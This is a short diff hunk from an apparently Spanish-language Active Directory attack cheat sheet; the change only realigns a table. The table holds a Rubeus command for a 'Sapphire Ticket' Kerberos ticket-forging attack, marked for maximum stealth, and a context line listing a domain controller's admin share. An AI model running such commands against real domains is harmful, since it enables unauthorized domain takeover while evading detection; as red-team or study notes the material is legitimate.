@@ -135,8 +135,8 @@ dir \\dc01.corp.local\c$
 
 ## Sapphire Ticket
 
-| **Comando** | **Qué hace** | **Cuándo** |
-|:---:|:---:|:---:|
+|                        **Comando**                        |                  **Qué hace**                  |   **Cuándo**    |
+| :-------------------------------------------------------: | :--------------------------------------------: | :-------------: |
 | `Rubeus.exe sapphire /user:admin /aes256:AES /dc:DC /ptt` | Copia PAC via S4U2Self+S4UProxy — no forja PAC | Máximo stealth. |
 ^gt-forge-sapphire
 
